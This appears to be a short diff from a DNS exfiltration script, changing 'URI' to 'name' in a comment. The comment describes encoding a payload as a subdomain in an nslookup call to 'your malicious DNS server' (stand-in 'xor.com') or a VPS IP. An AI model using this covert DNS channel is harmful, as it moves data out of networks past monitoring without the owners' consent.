@@ -21,7 +21,7 @@ def dnsRequest(payload):
     print(nscommand)
 
     # now i make the request, like:  $ nslookup x.payload.xor.com IPserverDNS
-    # 'xor.com' is a generic URI, You have to change It with your malicious DNS server URI
+    # 'xor.com' is a generic name, You have to change It with your malicious DNS server name
     #or if you are not an auth DNS, replace IPserverDNS with your VPS IP
 
 
